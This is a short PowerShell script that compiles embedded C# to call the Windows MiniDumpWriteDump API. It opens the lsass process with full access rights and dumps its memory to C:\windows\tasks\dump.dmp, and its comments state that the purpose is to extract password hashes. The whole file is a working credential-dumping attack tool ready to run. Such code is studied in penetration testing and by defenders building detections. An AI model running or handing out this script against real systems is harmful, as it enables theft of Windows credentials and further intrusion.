#MiniDumpWriteDump.ps1

#Script uses win32 api's to call MiniDumpWriteDump to extract a dump from the PC to get hashes.
#Dumps to C:\windows\tasks\dump.dmp

Add-Type -TypeDefinition @" 



using System.Runtime.InteropServices;
using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;

public class MiniDump
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("Dbghelp.dll")]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, uint ProcessId, IntPtr hFile, int DumpType, ref MINIDUMP_EXCEPTION_INFORMATION ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);

        [StructLayout(LayoutKind.Sequential, Pack = 4)]
        public struct MINIDUMP_EXCEPTION_INFORMATION
        {
            public uint ThreadId;
            public IntPtr ExceptionPointers;
            public int ClientPointers;
        }

        public void dump()
        {
            Process[] process = Process.GetProcessesByName("lsass");

            MINIDUMP_EXCEPTION_INFORMATION exceptionInfo = new MINIDUMP_EXCEPTION_INFORMATION();
            System.IO.FileStream outfile = new System.IO.FileStream("C:\\windows\\tasks\\dump.dmp", System.IO.FileMode.CreateNew);

            IntPtr handle = OpenProcess(0x001F0FFF, false, process[0].Id);
            
            bool worked = MiniDumpWriteDump(handle, (uint)process[0].Id, outfile.SafeFileHandle.DangerousGetHandle(),  2, ref exceptionInfo, IntPtr.Zero, IntPtr.Zero);

            Console.WriteLine("Dump Worked: " + worked.ToString());
            Console.WriteLine("Check: " + "C:\\windows\\tasks\\dump.dmp");
        }
    }


"@


$minidump = [MiniDump]::new()
$minidump.dump()
